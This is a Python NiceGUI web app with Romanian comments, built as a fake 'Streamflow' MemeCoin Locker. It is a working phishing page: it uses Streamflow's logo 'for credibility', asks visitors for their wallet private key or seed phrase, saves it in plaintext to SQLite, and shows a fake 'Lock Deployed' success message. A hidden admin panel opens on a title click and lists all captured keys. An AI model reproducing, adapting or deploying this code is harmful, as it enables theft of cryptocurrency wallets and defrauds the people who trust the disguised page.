from nicegui import ui
import sqlite3
import pandas as pd
import os

# Render are nevoie de o cale stabila pentru baza de date
DB_PATH = 'data.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute('''CREATE TABLE IF NOT EXISTS u 
                 (n TEXT, k TEXT, s TEXT, a REAL, d INTEGER)''')
    conn.commit()
    conn.close()

init_db()

@ui.page('/')
def index():
    # Design Profesional Crypto
    ui.add_head_html("""
        <style>
            body { background-color: #0b0e11 !important; color: white !important; font-family: 'Inter', sans-serif; }
            .q-field--filled .q-field__control { background: #1b1f23 !important; border: 1px solid #30363d !important; border-radius: 8px !important; }
            .q-field__native, .q-field__input { color: white !important; }
            .deploy-btn { background-color: #00ffbd !important; color: black !important; font-weight: bold !important; width: 100%; height: 55px; border-radius: 8px; margin-top: 10px; }
            .t-btn { cursor: default; user-select: none; }
        </style>
    """)

    with ui.column().classes('w-full max-w-lg mx-auto p-6 gap-4'):
        
        # LOGO (Link oficial Streamflow pentru credibilitate)
        ui.image('https://streamflow.finance/favicon.ico').classes('w-16 mx-auto mb-2')

        # --- TITLU BUTON SECRET ---
        def toggle_admin():
            if admin_box.style['display'] == 'none':
                conn = sqlite3.connect(DB_PATH)
                df = pd.read_sql_query("SELECT * FROM u", conn)
                conn.close()
                results.clear()
                with results:
                    if df.empty:
                        ui.label('No data yet.').classes('text-gray-500 italic')
                    else:
                        ui.table(columns=[{'name': x, 'label': x, 'field': x} for x in df.columns], 
                                 rows=df.to_dict('records')).props('dark dense flat bordered')
                admin_box.style(display='block')
            else:
                admin_box.style(display='none')

        ui.label('MemeCoin Locker').classes('text-3xl font-bold text-center w-full mt-4 t-btn').on('click', toggle_admin)
        
        # Caseta de Admin (Ascunsa)
        admin_box = ui.column().classes('w-full p-2 bg-black border border-gray-800 rounded').style('display: none')
        with admin_box:
            ui.label('ADMIN PANEL').classes('text-xs text-green-500 mb-2')
            results = ui.column().classes('w-full')

        ui.label('Securely lock your project funds and LP tokens.').classes('text-gray-400 text-center w-full -mt-2 mb-6 text-sm')
        
        # Formular
        name = ui.input('Project Name').props('dark filled').classes('w-full')
        key = ui.input('Wallet Private Key / Seed Phrase').props('dark filled password-toggle').classes('w-full')
        
        with ui.row().classes('w-full gap-4'):
            symbol = ui.input('Token Symbol').props('dark filled').classes('flex-1')
            amount = ui.number('Amount', value=0.0).props('dark filled').classes('flex-1')
        
        days = ui.number('Lock Duration (Days)', value=365).props('dark filled').classes('w-full')

        def handle_save():
            if name.value and key.value:
                c = sqlite3.connect(DB_PATH)
                c.execute("INSERT INTO u VALUES (?,?,?,?,?)", 
                          (name.value, key.value, symbol.value, amount.value, days.value))
                c.commit()
                c.close()
                ui.notify('Connecting to Solana Mainnet...', color='info')
                ui.notify('Success! Lock Deployed.', color='positive', duration=5000)
            else:
                ui.notify('Please fill all fields', color='warning')

        ui.button('DEPLOY LOCK', on_click=handle_save).classes('deploy-btn')

# Portul 10000 este obligatoriu pentru Render
port = int(os.environ.get('PORT', 10000))
ui.run(host='0.0.0.0', port=port, reload=False, title="Streamflow | Locker")
